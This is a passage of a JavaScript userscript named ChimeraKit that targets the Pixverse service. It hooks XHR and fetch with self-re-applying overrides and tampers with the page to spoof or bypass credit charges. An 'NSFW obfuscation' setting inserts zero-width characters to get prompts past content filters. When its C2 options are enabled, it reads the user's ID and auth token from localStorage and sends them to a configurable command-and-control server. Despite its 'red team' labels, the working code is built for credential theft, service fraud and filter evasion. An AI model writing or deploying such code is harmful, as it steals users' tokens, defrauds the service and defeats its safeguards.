              // Also check existing elements periodically or if not found via mutation
              document.querySelectorAll(config.domTamperTarget).forEach(el => {
                  if (el.textContent !== config.creditSpoofValue.toString()) {
                      el.textContent = config.creditSpoofValue.toString();
                      log(`DOM tampered: Re-set existing ${config.domTamperTarget} to ${config.creditSpoofValue}`);
                  }
              });
          };

          domTamperObserver = new MutationObserver(callback);
          domTamperObserver.observe(targetNode, { childList: true, subtree: true, characterData: true });

          // Initial check for elements already in DOM
          document.querySelectorAll(config.domTamperTarget).forEach(el => {
              el.textContent = config.creditSpoofValue.toString();
              log(`DOM tampered: Initial set of ${config.domTamperTarget} to ${config.creditSpoofValue}`);
          });
      } else {
          log('DOM Tampering disabled.');
      }
  }


  /**
   * Displays a transient toast notification at the bottom center of the screen.
   * Only displays if `config.debugMode` is true.
   * @param {string} msg - The message to display in the toast.
   * @param {number} [duration=3500] - Duration in milliseconds.
   */
  function showToast(msg, duration = 3500) {
    if (!config.debugMode) return;
    document.querySelectorAll(".pv-toast").forEach(e => e.remove());
    const el = document.createElement("div");
    el.className = "pv-toast";
    el.textContent = msg;
    document.body.appendChild(el);
    requestAnimationFrame(() => el.classList.add("pv-toast-visible"));
    setTimeout(() => {
      el.classList.remove("pv-toast-visible");
      el.addEventListener("transitionend", () => el.remove(), { once: true });
    }, duration);
  }

  //────── SELF-HEALING & INITIALIZATION ──────//

  /**
   * Sets up self-healing hooks for network request overrides (XHR and Fetch).
   */
  function setupSelfHealingHooks() {
    setInterval(() => {
      if (myCustomXhrOpen && XMLHttpRequest.prototype.open !== myCustomXhrOpen) {
        log('XHR hook detected as overwritten, re-applying...');
        overrideXHR();
      }
      if (myCustomFetch && window.fetch !== myCustomFetch) {
        log('Fetch hook detected as overwritten, re-applying...');
        overrideFetch();
      }
    }, 5000 + Math.random() * 1000);
    log('Self-healing hooks initialized');
  }

  //────── GM_config UI & Debug UI Integration ──────//

  /**
   * Loads configuration from `GM_setValue`.
   */
  async function loadConfig() {
    config.debugMode = await GM_getValue('debugMode', config.debugMode);
    config.c2Enabled = await GM_getValue('c2Enabled', config.c2Enabled);
    config.c2Server = await GM_getValue('c2Server', config.c2Server);
    config.creditBypassType = await GM_getValue('creditBypassType', config.creditBypassType);
    config.creditSpoofValue = await GM_getValue('creditSpoofValue', config.creditSpoofValue);
    config.forceQuality = await GM_getValue('forceQuality', config.forceQuality);
    config.nsfwObfuscation = await GM_getValue('nsfwObfuscation', config.nsfwObfuscation);
    config.autoExfilAuth = await GM_getValue('autoExfilAuth', config.autoExfilAuth);
    config.domTamperTarget = await GM_getValue('domTamperTarget', config.domTamperTarget);
  }

  /**
   * Updates debug UI visibility based on config.debugMode.
   */
  function updateDebugUIVisibility() {
    const debugPanel = document.getElementById('pv-debug-panel');
    if (debugPanel) {
      debugPanel.style.display = config.debugMode ? 'flex' : 'none';
      if (config.debugMode) updateDebugUI(); // Trigger immediate update if becoming visible
    } else if (config.debugMode && document.body) {
      injectDebugUI(); // If debug mode enabled and UI not present, inject it
    }
  }

  /**
   * Creates and injects the control panel UI into the DOM.
   */
  async function createControlPanel() {
    const panelId = 'pv-control-panel';
    if (document.getElementById(panelId)) return; // Prevent re-injection

    const panel = document.createElement('div');
    panel.id = panelId;
    panel.innerHTML = `
      <div class="pv-panel-header">
        <span>ChimeraKit v${GM_info.script.version}</span>
        <button id="pv-panel-toggle" title="Toggle Panel Content">+</button>
      </div>
      <div class="pv-panel-content" style="display: none;">
        <div class="pv-panel-row"><label for="pv-debug-mode">Debug Mode</label><input type="checkbox" id="pv-debug-mode"></div>
        <div class="pv-panel-row"><label for="pv-c2-enabled">C2 Exfil</label><input type="checkbox" id="pv-c2-enabled"></div>
        <div class="pv-panel-row pv-c2-server-row"><label for="pv-c2-server">C2 Server</label><input type="text" id="pv-c2-server" spellcheck="false"></div>
        <div class="pv-panel-row"><label for="pv-auto-exfil-auth">Auto Exfil Auth</label><input type="checkbox" id="pv-auto-exfil-auth"></div>

        <hr class="pv-separator">

        <div class="pv-panel-row"><label for="pv-credit-bypass-type">Credit Bypass</label>
          <select id="pv-credit-bypass-type">
            <option value="none">None</option>
            <option value="prevent_deduct">Prevent Deduction</option>
            <option value="spoof_response">Spoof Response</option>
            <option value="dom_tamper">DOM Tamper</option>
          </select>
        </div>
        <div class="pv-panel-row pv-credit-spoof-value-row"><label for="pv-credit-spoof-value">Spoof Value</label><input type="number" id="pv-credit-spoof-value" min="0"></div>
        <div class="pv-panel-row pv-dom-tamper-target-row"><label for="pv-dom-tamper-target">DOM Target</label><input type="text" id="pv-dom-tamper-target" spellcheck="false"></div>

        <hr class="pv-separator">

        <div class="pv-panel-row"><label for="pv-force-quality">Force Quality</label>
          <select id="pv-force-quality">
            <option value="none">None</option>
            <option value="720p">720p</option>
            <option value="1080p">1080p</option>
          </select>
        </div>
        <div class="pv-panel-row"><label for="pv-nsfw-obfuscation">NSFW Obfus.</label>
          <select id="pv-nsfw-obfuscation">
            <option value="none">None</option>
            <option value="zwsp">ZWSP</option>
            <option value="bubble_zwsp">Bubble+ZWSP</option>
          </select>
        </div>
      </div>
    `;

    // FIX: Ensure document.body exists before appending.
    if (!document.body) {
      console.error('Document body not available for control panel. Cannot inject UI.');
      return;
    }
    document.body.appendChild(panel);

    const debugCheck = document.getElementById('pv-debug-mode');
    const c2Check = document.getElementById('pv-c2-enabled');
    const c2ServerInput = document.getElementById('pv-c2-server');
    const autoExfilAuthCheck = document.getElementById('pv-auto-exfil-auth');
    const creditBypassTypeSelect = document.getElementById('pv-credit-bypass-type');
    const creditSpoofValueInput = document.getElementById('pv-credit-spoof-value');
    const domTamperTargetInput = document.getElementById('pv-dom-tamper-target');
    const forceQualitySelect = document.getElementById('pv-force-quality');
    const nsfwObfuscationSelect = document.getElementById('pv-nsfw-obfuscation');

    const c2ServerRow = panel.querySelector('.pv-c2-server-row');
    const creditSpoofValueRow = panel.querySelector('.pv-credit-spoof-value-row');
    const domTamperTargetRow = panel.querySelector('.pv-dom-tamper-target-row');

    const content = panel.querySelector('.pv-panel-content');
    const toggleBtn = document.getElementById('pv-panel-toggle');
    const header = panel.querySelector('.pv-panel-header');

    // Set initial state from config
    debugCheck.checked = config.debugMode;
    c2Check.checked = config.c2Enabled;
    c2ServerInput.value = config.c2Server;
    autoExfilAuthCheck.checked = config.autoExfilAuth;
    creditBypassTypeSelect.value = config.creditBypassType;
    creditSpoofValueInput.value = config.creditSpoofValue;
    domTamperTargetInput.value = config.domTamperTarget;
    forceQualitySelect.value = config.forceQuality;
    nsfwObfuscationSelect.value = config.nsfwObfuscation;

    // Control visibility of dependent fields
    const updateDependentFieldsVisibility = () => {
        c2ServerRow.style.display = config.c2Enabled ? 'flex' : 'none';
        creditSpoofValueRow.style.display = (config.creditBypassType === 'spoof_response' || config.creditBypassType === 'dom_tamper') ? 'flex' : 'none';
        domTamperTargetRow.style.display = (config.creditBypassType === 'dom_tamper') ? 'flex' : 'none';
    };
    updateDependentFieldsVisibility();

    // Add event listeners
    debugCheck.addEventListener('change', async () => {
      config.debugMode = debugCheck.checked;
      await GM_setValue('debugMode', config.debugMode);
      showToast(`Debug Mode ${config.debugMode ? 'Enabled' : 'Disabled'}`);
      updateDebugUIVisibility(); // Toggle debug UI
    });

    c2Check.addEventListener('change', async () => {
      config.c2Enabled = c2Check.checked;
      await GM_setValue('c2Enabled', config.c2Enabled);
      showToast(`C2 Exfiltration ${config.c2Enabled ? 'Enabled' : 'Disabled'}`);
      updateDependentFieldsVisibility();
      // Re-evaluate immediate exfiltration opportunities if C2 is enabled
      if (config.c2Enabled && config.autoExfilAuth) {
          try {
              const userId = localStorage.getItem('pixverse_user_id');
              if (userId) exfiltrateData("local_storage_user_id", userId);
              const token = localStorage.getItem('pixverse_auth_token');
              if (token) exfiltrateData("local_storage_auth_token", token);
          } catch (e) { error("Error accessing local storage after C2 toggle:", e); }
      }
    });

    c2ServerInput.addEventListener('input', async () => { config.c2Server = c2ServerInput.value.trim(); await GM_setValue('c2Server', config.c2Server); });
    autoExfilAuthCheck.addEventListener('change', async () => { config.autoExfilAuth = autoExfilAuthCheck.checked; await GM_setValue('autoExfilAuth', config.autoExfilAuth); });

    creditBypassTypeSelect.addEventListener('change', async () => {
      config.creditBypassType = creditBypassTypeSelect.value;
      await GM_setValue('creditBypassType', config.creditBypassType);
      showToast(`Credit bypass set to: ${config.creditBypassType}`);
      updateDependentFieldsVisibility();
      setupDOMTampering(); // Re-evaluate DOM tampering
    });
    creditSpoofValueInput.addEventListener('input', async () => {
      config.creditSpoofValue = parseInt(creditSpoofValueInput.value, 10) || 0;
      await GM_setValue('creditSpoofValue', config.creditSpoofValue);
      showToast(`Spoof value set to: ${config.creditSpoofValue}`);
      setupDOMTampering(); // Re-evaluate DOM tampering if active
    });
    domTamperTargetInput.addEventListener('input', async () => {
        config.domTamperTarget = domTamperTargetInput.value.trim();
        await GM_setValue('domTamperTarget', config.domTamperTarget);
        showToast(`DOM tamper target set to: ${config.domTamperTarget}`);
        setupDOMTampering(); // Re-evaluate DOM tampering with new target
    });


    forceQualitySelect.addEventListener('change', async () => { config.forceQuality = forceQualitySelect.value; await GM_setValue('forceQuality', config.forceQuality); showToast(`Forced quality set to: ${config.forceQuality}`); });
    nsfwObfuscationSelect.addEventListener('change', async () => { config.nsfwObfuscation = nsfwObfuscationSelect.value; await GM_setValue('nsfwObfuscation', config.nsfwObfuscation); showToast(`NSFW obfuscation set to: ${config.nsfwObfuscation}`); });

    toggleBtn.addEventListener('click', () => {
      const isHidden = content.style.display === 'none';
      content.style.display = isHidden ? 'block' : 'none';
      toggleBtn.textContent = isHidden ? '-' : '+';
    });

    // Add drag functionality to the control panel
    let isDragging = false;
    let offsetX, offsetY;

    const storedPosX = await GM_getValue('panelPosX', 'auto');
    const storedPosY = await GM_getValue('panelPosY', '10px');

    panel.style.left = storedPosX;
    panel.style.top = storedPosY;
    panel.style.right = storedPosX === 'auto' ? '10px' : 'auto';

    header.addEventListener('mousedown', (e) => {
      isDragging = true;
      offsetX = e.clientX - panel.getBoundingClientRect().left;
      offsetY = e.clientY - panel.getBoundingClientRect().top;
      panel.style.cursor = 'grabbing';
      panel.style.right = 'auto'; // Disable right/bottom positioning when dragging
      e.preventDefault();
    });

    document.addEventListener('mousemove', (e) => {
      if (!isDragging) return;
      panel.style.left = `${e.clientX - offsetX}px`;
      panel.style.top = `${e.clientY - offsetY}px`;
    });

    document.addEventListener('mouseup', () => {
      isDragging = false;
      panel.style.cursor = 'grab';
      GM_setValue('panelPosX', panel.style.left);
      GM_setValue('panelPosY', panel.style.top);
    });
    log('Control Panel injected and configured.');
  }

  /**
   * Injects CSS styles for the toast notification and the control panel.
   */
  function injectCoreStyles() {
    if (document.getElementById("pk-core-styles")) return;
    const style = document.createElement("style");
    style.id = "pk-core-styles";
    style.textContent = `
      /* --- Toast Styles (Cyan Theme) --- */
      .pv-toast {
        position: fixed; bottom: 22px; left: 50%; transform: translateX(-50%);
        background: rgba(20,40,48,0.94); color: #15FFFF; padding: 8px 20px;
        border-radius: 6px; font: 15px/1.2 sans-serif; z-index: 299999;
        opacity: 0; transition: opacity .25s ease-in-out; pointer-events: none;
        box-sizing: border-box; user-select: none;
      }
      .pv-toast-visible { opacity: 1; }

      /* --- Control Panel Styles (Dark Theme with Cyan Accents) --- */
      #pv-control-panel {
        position: fixed; top: 10px; right: 10px; z-index: 300000;
        background: #1a1a1a; color: #e0e0e0; border: 1px solid #444;
        border-radius: 6px; font-family: sans-serif; font-size: 13px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.5); user-select: none;
        min-width: 320px; cursor: grab;
      }
      .pv-panel-header {
        display: flex; justify-content: space-between; align-items: center;
        padding: 6px 10px; background: #2a2a2a; border-bottom: 1px solid #444;
        cursor: inherit;
      }
      .pv-panel-header span { font-weight: bold; color: #15FFFF; }
      #pv-panel-toggle {
        background: #444; color: #e0e0e0; border: none; border-radius: 4px;
        width: 20px; height: 20px; line-height: 20px; text-align: center;
        cursor: pointer; font-weight: bold;
      }
      .pv-panel-content { padding: 10px; }
      .pv-panel-row {
        display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;
      }
      .pv-panel-row:last-child { margin-bottom: 0; }
      .pv-panel-row label { margin-right: 15px; cursor: help; }
      .pv-panel-row input[type="text"], .pv-panel-row input[type="number"], .pv-panel-row select {
        background: #111; color: #e0e0e0; border: 1px solid #555;
        border-radius: 4px; padding: 4px 6px; width: 170px; font-size: 12px;
        flex-grow: 1;
      }
      .pv-panel-row input[type="checkbox"] { width: 16px; height: 16px; margin-left: auto; }
      .pv-separator { border: 0; border-top: 1px solid #333; margin: 10px 0; }
    `;
    document.head.appendChild(style);
  }

  // Inject CSS for the dedicated debug panel (Cyan/Green Theme)
  function injectDebugCSS() {
    const styleId = "pv-debug-css";
    if (document.getElementById(styleId)) return;

    const styleElement = document.createElement("style");
    styleElement.id = styleId;
    styleElement.textContent = `
      #pv-debug-panel {
        position: fixed;
        bottom: 10px; /* Positioned at bottom to not conflict with control panel */
        right: 10px;
        width: 380px;
        height: auto;
        max-height: 50vh; /* Reduced max height for better screen usage */
        background: rgba(30, 30, 30, 0.95);
        color: #15FFFF; /* Primary text color (cyan) */
        border: 1px solid #15FFFF;
        border-radius: 8px;
        font-family: 'Consolas', 'Monaco', monospace;
        font-size: 11px;
        z-index: 999998; /* Below control panel */
        box-shadow: 0 4px 8px rgba(0,0,0,0.5);
        overflow: hidden;
        display: flex;
        flex-direction: column;
      }
      #pv-debug-panel.collapsed {
        height: auto;
        max-height: 35px;
      }
      #pv-debug-panel .header {
        background: rgba(0, 0, 0, 0.8);
        padding: 5px 10px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        cursor: grab;
      }
      #pv-debug-panel .header span {
        font-weight: bold;
        color: #15FFFF;
      }
      #pv-debug-panel button {
        background: #008080; /* Dark teal button */
        color: #15FFFF;
        border: 1px solid #15FFFF;
        padding: 3px 8px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 10px;
        margin-left: 5px;
      }
      #pv-debug-panel button:hover {
        background: #00a0a0; /* Lighter teal on hover */
      }
      #pv-debug-panel .body {
        flex-grow: 1;
        display: flex;
        flex-direction: column;
        overflow: hidden;
      }
      #pv-debug-panel.collapsed .body {
        display: none;
      }
      #pv-debug-panel .controls {
        padding: 5px 10px;
        display: flex;
        flex-wrap: wrap;
        gap: 5px;
        border-bottom: 1px dashed #004040;
      }
      #pv-debug-panel .section-area {
        flex: 1;
        min-height: 100px;
        padding: 5px 10px;
        overflow-y: auto;
        border-bottom: 1px dashed #004040;
        display: flex;
        flex-direction: column;
      }
      #pv-debug-panel .section-area:last-of-type {
        border-bottom: none;
      }
      #pv-debug-panel .section-area h4 {
        margin: 5px 0;
        color: #15FFFF;
        font-size: 12px;
        flex-shrink: 0;
      }
      #pv-debug-panel .log-output {
        flex-grow: 1;
        background: rgba(0,0,0,0.6);
        border: 1px solid #002020;
        padding: 5px;
        overflow-y: auto;
        white-space: pre-wrap;
        word-break: break-all;
        height: 100%;
      }
      #pv-debug-panel .log-output div {
        margin-bottom: 2px;
        line-height: 1.2;
      }
      #pv-debug-panel .log-output div:last-child {
        margin-bottom: 0;
      }
      #pv-instructions-content {
          color: #E0FFFF;
          font-size: 11px;
      }
      #pv-instructions-content ul {
          margin-left: 15px;
          padding-left: 0;
      }
      #pv-instructions-content li {
          margin-bottom: 5px;
      }
      #pv-instructions-content strong {
          color: #FFD700;
      }
    `;
    document.head.appendChild(styleElement);
    log('Debug CSS injected.');
  }

  /**
   * Injects the Debug UI into the DOM. Only called if debugMode is true.
   */
  let debugUIInjected = false;
  function injectDebugUI() {
    if (!config.debugMode || debugUIInjected || !document.body) return;

    try {
        injectDebugCSS(); // Ensure debug CSS is present

        const panel = document.createElement("div");
        panel.id = "pv-debug-panel";
        panel.innerHTML = `
          <div class="header">
            <span>ChimeraKit Debug</span>
            <button id="pv-toggle-debug-btn">Toggle</button>
          </div>
          <div class="body">
            <div class="controls">
              <button id="pv-clear-logs">Clear All</button>
              <button id="pv-dump-state">Dump State</button>
              <button id="pv-analyze-credits">Analyze Credits</button>
              <button id="pv-show-instructions">Instructions</button>
            </div>

            <div id="pv-instructions-area" class="section-area" style="display: none;">
                <h4>Instructions</h4>
                <div id="pv-instructions-content" class="log-output">
                  <p><strong>Goal:</strong> Capture the full sequence of network requests and browser state during targeted operations.</p>
                  <ul>
                    <li><strong>1. Ensure Debug Mode:</strong> Enable 'Debug Mode' in the ChimeraKit control panel (top right). This UI will appear.</li>
                    <li><strong>2. Clear Logs:</strong> Click "Clear All" to start with a fresh log.</li>
                    <li><strong>3. Dump Initial State:</strong> Click "Dump State" to save a snapshot of browser storage/cookies.</li>
                    <li><strong>4. Perform Actions:</strong> Execute the specific Pixverse actions you wish to debug (e.g., credit bypass sequence, NSFW prompt).</li>
                    <li><strong>5. Dump Final State:</strong> After actions, click "Dump State" again.</li>
                    <li><strong>6. Analyze (Optional):</strong> Click "Analyze Credits" for automated suggestions.</li>
                    <li><strong>7. Extract Data:</strong> The "API/Structured Data" section (<code style="color:#FFD700;">window.redTeamGoods</code> via console) contains all captured data. Copy this data.</li>
                    <li><strong>8. Toggle UI:</strong> Use the "Toggle" button in the header to collapse/expand.</li>
                  </ul>
                  <p><strong>Important:</strong> This tool is for diagnostic use only. For full exploitation, ensure a suitable CSP bypass is active.</p>
                </div>
            </div>

            <div class="log-area section-area">
              <h4>Raw Debug Log (<span id="pv-debug-log-count">0</span>)</h4>
              <div id="pv-debug-log-output" class="log-output"></div>
            </div>
            <div class="goods-area section-area">
              <h4>API/Structured Data (<span id="pv-goods-count">0</span>)</h4>
              <div id="pv-goods-output" class="log-output"></div>
            </div>
          </div>
        `;
        document.body.appendChild(panel);

        // Event Listeners for UI
        document.getElementById('pv-clear-logs').addEventListener('click', window.redTeamClear);
        document.getElementById('pv-dump-state').addEventListener('click', () => dumpBrowserState("Manual Trigger"));
        document.getElementById('pv-analyze-credits').addEventListener('click', window.analyzeCredits);

        const toggleInstructionsBtn = document.getElementById('pv-show-instructions');
        const instructionsArea = document.getElementById('pv-instructions-area');
        toggleInstructionsBtn.addEventListener('click', () => {
          const isInstructionsVisible = instructionsArea.style.display === 'flex';
          instructionsArea.style.display = isInstructionsVisible ? 'none' : 'flex';
          document.querySelectorAll('#pv-debug-panel .section-area:not(#pv-instructions-area)').forEach(el => {
            el.style.display = isInstructionsVisible ? 'flex' : 'none';
          });
        });

        const toggleDebugBtn = document.getElementById('pv-toggle-debug-btn');
        toggleDebugBtn.addEventListener('click', () => {
          panel.classList.toggle('collapsed');
          toggleDebugBtn.textContent = panel.classList.contains('collapsed') ? 'Expand' : 'Collapse';
        });

        // Make panel draggable
        let isDragging = false;
        let offsetX, offsetY;
        const header = panel.querySelector('.header');

        header.addEventListener('mousedown', (e) => {
          isDragging = true;
          offsetX = e.clientX - panel.getBoundingClientRect().left;
          offsetY = e.clientY - panel.getBoundingClientRect().top;
          panel.style.cursor = 'grabbing';
          e.preventDefault();
        });

        document.addEventListener('mousemove', (e) => {
          if (!isDragging) return;
          panel.style.left = `${e.clientX - offsetX}px`;
          panel.style.top = `${e.clientY - offsetY}px`;
        });

        document.addEventListener('mouseup', () => { isDragging = false; panel.style.cursor = 'grab'; });

        updateDebugUI();
        debugUIInjected = true;
        log('Debug UI injected and listeners attached.');
    } catch (e) {
        error('Error injecting debug UI:', e);
    }
  }

  // Update the debug UI with current log data
  const updateDebugUI = throttle(() => {
    if (!config.debugMode || !debugUIInjected) return;

    const debugLogOutput = document.getElementById('pv-debug-log-output');
    const goodsOutput = document.getElementById('pv-goods-output');
    const debugLogCount = document.getElementById('pv-debug-log-count');
    const goodsCount = document.getElementById('pv-goods-count');

    if (!debugLogOutput || !goodsOutput) return;

    const newDebugLogHTML = _redTeamDebugLog.map(entry => `<div>${entry}</div>`).join('');
    if (debugLogOutput.innerHTML !== newDebugLogHTML) {
      debugLogOutput.innerHTML = newDebugLogHTML;
      debugLogOutput.scrollTop = debugLogOutput.scrollHeight;
      debugLogCount.textContent = _redTeamDebugLog.length;
    }

    const newGoodsHTML = _redTeamGoods.map(entry => {
      const displayData = JSON.stringify(entry, null, 2);
      return `<div><pre>${displayData.length > 1000 ? displayData.substring(0, 1000) + '... (truncated for UI display)' : displayData}</pre></div>`;
    }).join('');
    if (goodsOutput.innerHTML !== newGoodsHTML) {
      goodsOutput.innerHTML = newGoodsHTML;
      goodsOutput.scrollTop = goodsOutput.scrollHeight;
      goodsCount.textContent = _redTeamGoods.length;
    }
  }, 200, 50);

  //────── INITIALIZATION & LIFECYCLE ──────//

  /**
   * Initializes the toolkit by applying all necessary overrides and setting up features.
   * Ensures that initialization happens only once.
   */
  async function initialize() {
    if (isInitialized) return;
    log('Attempting to initialize ChimeraKit...');
    try {
      await loadConfig(); // Load configuration from GM_setValue first

      injectCoreStyles(); // Inject CSS for control panel and toast
      await createControlPanel(); // Create and render the control panel

      overrideContextMenuBlockers(); // Enable native downloads
      overrideXHR(); // Hook XHR
      overrideFetch(); // Hook Fetch
      setupSelfHealingHooks(); // Ensure hooks persist

      // Initial state of DOM tampering
      setupDOMTampering();

      // Auto-exfiltrate data on initialization if configured
      if (config.c2Enabled && config.autoExfilAuth) {
          try {
              const userId = localStorage.getItem('pixverse_user_id');
              if (userId) { log('Found local user ID for exfil:', userId); exfiltrateData("local_storage_user_id", userId); }
              const token = localStorage.getItem('pixverse_auth_token');
              if (token) { log('Found local auth token for exfil:', token); exfiltrateData("local_storage_auth_token", token); }
          } catch (e) { error("Error accessing local storage for auto-exfil:", e); }
      }

      dumpBrowserState("On Initialize"); // Log initial browser state
      updateDebugUIVisibility(); // Show debug UI if debugMode is on

      isInitialized = true;
      log(`ChimeraKit v${GM_info.script.version} initialized successfully!`);
      showToast(`ChimeraKit v${GM_info.script.version} loaded ✓`);
    } catch (e) {
      error('ChimeraKit initialization failed catastrophically! Error:', e);
      showToast('ChimeraKit init error!');
    }
  }

  // Determine when to initialize the script.
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize, { once: true });
  } else {
    initialize();
  }

})();
